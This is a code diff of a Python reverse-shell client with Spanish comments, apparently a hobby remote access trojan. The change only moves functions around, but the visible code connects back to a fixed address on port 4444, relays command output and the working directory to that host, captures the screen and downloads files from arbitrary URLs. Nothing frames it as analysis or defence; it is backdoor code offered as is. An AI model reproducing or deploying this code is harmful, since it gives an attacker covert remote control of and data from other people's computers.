@@ -16,24 +16,7 @@ import time
 import shutil
 import sys
 
-def conexion():
-    while True:
-        time.sleep(5)
-        try:
-            cliente.connect(("192.168.0.186",4444))
-            shell()
-        except:
-            conexion()      
-
-def captura_pantalla():
-    screen = mss.mss()
-    screen.shot()
-    
-def descargar_archivo(url):
-    consulta = requests.get(url)
-    nombre_archivo = url.split("/")[-1] #[-1] => ultimo elemento, split permite generar lista separada a traves de caracter
-    with open(nombre_archivo, 'wb') as archivo_obtenido:
-        archivo_obtenido.write(consulta.content)             
+        
 def shell(): #funcion para la ejecución de comandos, directorio, exit, cd, --descargar, --cargar
     directorio_actual = os.getcwd()
     cliente.send(directorio_actual) #directorio actual
@@ -77,6 +60,25 @@ def shell(): #funcion para la ejecución de comandos, directorio, exit, cd, --de
                 cliente.send("1")
             else:              
                 cliente.send(resultado)
+def conexion():
+    while True:
+        time.sleep(5)
+        try:
+            cliente.connect(("192.168.0.186",4444))
+            shell()
+        except:
+            conexion()      
+
+def captura_pantalla():
+    screen = mss.mss()
+    screen.shot()
+    
+def descargar_archivo(url):
+    consulta = requests.get(url)
+    nombre_archivo = url.split("/")[-1] #[-1] => ultimo elemento, split permite generar lista separada a traves de caracter
+    with open(nombre_archivo, 'wb') as archivo_obtenido:
+        archivo_obtenido.write(consulta.content)     
+        
 cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 conexion()
 cliente.close()
